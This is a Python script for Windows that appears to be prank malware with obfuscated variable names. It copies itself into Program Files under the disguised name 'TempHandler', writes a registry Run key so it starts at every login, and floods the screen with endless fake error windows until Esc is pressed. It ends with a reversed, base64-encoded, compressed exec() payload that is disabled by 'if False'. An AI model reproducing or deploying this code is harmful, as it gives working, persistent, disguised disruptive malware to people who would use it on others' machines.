import time, shutil, os, threading, sys, random, keyboard
import tkinter as tk
from tkinter import messagebox as wevr42sa
import winreg as reg
def dwbvcfgb43(b34rt, b40tihb="registrydictionary"):
    try:
        n4u89vr90qhbt0bh3q4tb = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(n4u89vr90qhbt0bh3q4tb, b40tihb, 0, reg.REG_SZ, b34rt)
        reg.CloseKey(n4u89vr90qhbt0bh3q4tb)
    except Exception as e:
        wevr42sa.showerror(title="Error", message=e)
if getattr(sys, 'frozen', False):
    jhn8m903bv = sys.executable
else:
    jhn8m903bv = __file__
hvcnby8u9 = 'C:\\Program Files\\Temp\\TempHandler.exe'
h8n02vrh32 = 'C:\\Program Files\\Temp'
try:
    os.makedirs(h8n02vrh32, exist_ok=True)
    jmortj9 = os.path.join(h8n02vrh32, os.path.basename(jhn8m903bv))
    if os.path.abspath(jhn8m903bv) != os.path.abspath(jmortj9):
        if not os.path.exists(jmortj9):
            shutil.copy2(jhn8m903bv, jmortj9)
except PermissionError:
    wevr42sa.showerror(title='Access Denied!', message='You have to run this application as an administrator.')
    sys.exit()
except Exception as e:
    wevr42sa.showerror(title='Error', message=f'An unexpected error occurred: {e}')
    sys.exit()
dwbvcfgb43(hvcnby8u9, b40tihb="TempHandler")
hyn4nud6u = True
def hqpxjce9an2():
    global hyn4nud6u
    ve5v = i9340bhwiueb.winfo_screenwidth()
    odjeh7whddwef = i9340bhwiueb.winfo_screenheight()
    moijejrv = 0
    cvgbhun = []
    if getattr(sys, 'frozen', False):
        fnuvowiev = sys._MEIPASS
    else:
        fnuvowiev = os.path.dirname(os.path.abspath(__file__))
    tg5n = os.path.join(fnuvowiev, "idio.gif")
    if not os.path.exists(tg5n):
        wevr42sa.showerror("Error, this OS is not supported.")
        sys.exit()
    r432 = tk.PhotoImage(file=tg5n)
    while hyn4nud6u:
        tb3 = random.randint(0, ve5v - 50)
        vygbhu9 = random.randint(0, odjeh7whddwef - 25)
        bee5t = tk.Toplevel()
        bee5t.geometry(f"492x360+{tb3}+{vygbhu9}")
        bee5t.title(f"Error {moijejrv}")
        v8v2032v = tk.Label(bee5t, image=r432)
        v8v2032v.pack(expand=True)
        cvgbhun.append(bee5t)
        moijejrv += 1
        if moijejrv % 1 == 0:
            time.sleep(0.00001)
            i9340bhwiueb.update()
    for wbfvriohu in cvgbhun:
        wbfvriohu.destroy()
    i9340bhwiueb.destroy()
def vjmjowvef():
    global hyn4nud6u
    keyboard.wait('esc')
    hyn4nud6u = False
i9340bhwiueb = tk.Tk()
i9340bhwiueb.withdraw()
threading.Thread(target=vjmjowvef, daemon=True).start()
hqpxjce9an2()

if False:
    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))